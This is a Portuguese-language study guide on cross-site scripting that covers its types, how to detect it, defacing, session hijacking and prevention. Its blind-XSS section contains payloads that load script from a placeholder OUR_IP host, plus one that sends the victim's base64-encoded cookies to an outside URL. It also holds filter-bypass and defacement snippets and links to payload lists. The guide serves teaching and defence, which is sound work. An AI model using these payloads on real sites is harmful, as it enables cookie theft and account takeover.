# 🔐 Cross-Site Scripting (XSS)

O **XSS (Cross-Site Scripting)** é uma vulnerabilidade web que permite a injeção de **scripts maliciosos (geralmente JavaScript)** em páginas acessadas por outros usuários.

---

# 📌 Tipos de XSS

## ⚡ XSS Reflected (Refletido)

### 📖 O que é

* Tipo mais comum de XSS
* O payload:

  * Vai até o servidor
  * **Volta (reflete)** na resposta
* ❌ Não é armazenado no banco

---

### 🕒 Quando ocorre

* Entrada via:

  * URL (`?param=valor`)
  * Formulários
* Backend insere a entrada **sem sanitização**

---

### 🔍 Como identificar

#### 🛠 Ferramentas

* ParamSpider
* Arjun
* Burp Suite / Caido

#### 🧪 Teste manual

1. Enviar uma **string única**
2. Ver no **código fonte (CTRL+U)**
3. Procurar a string

✔ Se aparecer → testar execução:

* Inserir caracteres especiais:

  ```
  ' " < >
  ```

✔ Se forem refletidos → possível vulnerabilidade

---

### 💥 Impactos

#### 🎣 Phishing com credibilidade (ALTA)

* Usa a **página real**
* Injeta formulário falso (HTML Injection)

---

#### 🍪 Roubo de sessão (CRÍTICO)

* Se **HttpOnly NÃO estiver ativo**:

```html
<script>alert(document.cookie)</script>
```

➡ Pode:

* Roubar cookie
* Sequestrar sessão
* Fazer account takeover

---

#### ⌨️ Keylogging (ALTA)

* Captura tudo digitado pelo usuário
* Exfiltra dados em tempo real

---

### 🧨 Exemplo de ataque

```
http://site.com?search=<script>...</script>
```

➡ A vítima precisa **clicar no link**

---

### 🔄 Bypass de filtros

#### ❌ Pode bloquear:

```html
<script>alert(1)</script>
```

#### ✅ Alternativas:

```html
<img src=x onerror=alert(1)>
```

---

### 🧠 Conceitos importantes

#### 🌐 window

* Representa o navegador
* Ex: `window.close()`

#### 📄 document

* Representa o DOM
* Ex: `document.cookie`

---

---

## 🧠 XSS Stored (Persistente)

### 📖 O que é

* Payload fica **armazenado no banco**
* Executa automaticamente para qualquer usuário

---

### 📍 Onde ocorre

* Comentários
* Perfis
* Fóruns
* Chats

---

### 🔍 Indícios

* Conteúdo:

  * Permanece após refresh
  * É salvo no sistema

---

### 💥 Impacto

* 🔥 Mais crítico que Reflected
* ❌ Não precisa interação da vítima
* ✔ Afeta múltiplos usuários

---

### 🆚 Reflected vs Stored

| Característica      | Reflected    | Stored     |
| ------------------- | ------------ | ---------- |
| Armazenamento       | ❌ Não        | ✔ Sim      |
| Interação da vítima | ✔ Necessária | ❌ Não      |
| Impacto             | Médio/Alto   | 🔥 Crítico |

---

## 🧩 XSS DOM-Based

### 📖 O que é

* O ataque ocorre **no navegador (client-side)**
* ❌ Servidor pode não participar

---

### ⚠️ Características

* Não gera logs no servidor
* Pode burlar WAF
* Ataque silencioso

---

### 🔍 Como identificar

#### 🔎 Analisar o JavaScript

---

### 🧪 Sources (fontes de entrada)

* `location.search` → query (`?id=`)
* `location.hash` → fragmento (`#test`)
* `document.referrer`

---

### 🎯 Sinks (pontos vulneráveis)

* `innerHTML`
* `document.write()`
* `eval()` ⚠️ PERIGOSO
* `setTimeout()` (com string)

---

### 💡 Exemplo

```javascript
element.innerHTML = location.search;
```

➡ Vulnerável se não houver sanitização

---

---

# 🧠 Contexto em XSS

Nem sempre funciona só inserir `<script>`

### ⚙️ Às vezes é necessário:

* Fechar strings (`" '`)
* Fechar parênteses `)`
* Usar `;` estrategicamente

➡ Criar payload específico para o **contexto do código**

---

# 🧾 Resumo Geral

| Tipo      | Onde ocorre    | Precisa interação? | Impacto    |
| --------- | -------------- | ------------------ | ---------- |
| Reflected | Resposta HTTP  | ✔ Sim              | Médio/Alto |
| Stored    | Banco de dados | ❌ Não              | 🔥 Crítico |
| DOM-Based | Navegador      | ❌ Não              | Alto       |

---

# 🧩 O que é IFrame

**Inline Frame (iframe)** é um elemento HTML que permite **embutir outra página web dentro da página atual**.

### 📌 Exemplo

```html
<iframe src="https://formulario.com"></iframe>
```

### 💡 Cenário típico

* Domínio principal: `main.com`
* Formulário em outro domínio: `formulario.com`
* O iframe permite exibir o formulário dentro do `main.com`

---

## 🔒 Relação com XSS

* Se o domínio embutido (**formulario.com**) for vulnerável a XSS:

  * ❌ **Não significa que o domínio principal (main.com) também é vulnerável**
* ✔️ O iframe **isola o contexto**, limitando o impacto

---

## 🧠 Truque do `window.origin`

### 🎯 Objetivo

Identificar **qual domínio está vulnerável**

### 🧪 Payload

```javascript
alert(window.origin)
```

### ✅ Resultado

* Retorna o **domínio onde o script está sendo executado**
* Ajuda a:

  * Evitar **falsos positivos**
  * Classificar melhor a **severidade da vulnerabilidade**

---

# 💣 Ataques XSS

## 🎭 Defacing

**Defacing** = Alterar a aparência do site para outros usuários

### 🛠️ Exemplos de manipulação:

* Alterar cor de fundo:

```javascript
document.body.style.background = "red";
```

* Trocar imagem de fundo:

```javascript
document.body.style.backgroundImage = "url('imagem.jpg')";
```

* Alterar título:

```javascript
document.title = "Site Hackeado";
```

* Alterar conteúdo:

```javascript
document.querySelector("h1").innerHTML = "Você foi hackeado";
```

---

## 🍪 Session Hijacking (Roubo de Cookie)

* Objetivo: **Roubar cookies de sessão**
* Permite acessar contas **sem login e senha**

---

# 👻 Blind XSS

## 🧠 O que é

* Tipo de **Stored XSS**
* Ocorre em partes da aplicação que **não conseguimos ver**

## 📍 Onde ocorre

* Formulários de contato
* Avaliações
* Tickets de suporte
* Dados de usuário
* Header `User-Agent`

---

## 🧪 Como testar Blind XSS

### ⚠️ Problema

* Não temos feedback visual (`alert(1)` não funciona)

### 💡 Solução: "GPS no payload"

* Inserir um payload que envia uma requisição para seu servidor

### 🖥️ Servidor

```bash
php -S IP:PORTA
```

### 📡 Exemplos de payloads

```html
<script src="http://OUR_IP/teste"></script>

'><script src=http://OUR_IP></script>

'"><img src=x onerror='this.src="https://example.com?"+btoa(document.cookie)'>
```

### 🏷️ Dica importante

Use **URLs diferentes para cada campo**:

```html
<script src="http://OUR_IP/nome"></script>
<script src="http://OUR_IP/email"></script>
```

➡️ Assim você identifica qual campo é vulnerável

---

# 🛡️ Prevenção

## 🎨 Front-end

❌ Evitar inserir input diretamente em:

```html
<script></script>
<style></style>
<!-- comentários -->
atributos HTML
```

❌ Evitar funções perigosas:

```javascript
innerHTML
outerHTML
document.write()
document.writeln()
document.domain
```

❌ Evitar métodos jQuery:

```javascript
html()
append()
prepend()
before()
after()
replaceWith()
```

---

## ⚙️ Back-end

✔️ Validação de entrada
✔️ Sanitização de dados

---

# 📚 Recursos de Payloads

* [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [https://github.com/payload-box/xss-payload-list](https://github.com/payload-box/xss-payload-list)
* [https://github.com/lauritzh/blind-xss-payloads](https://github.com/lauritzh/blind-xss-payloads)

---




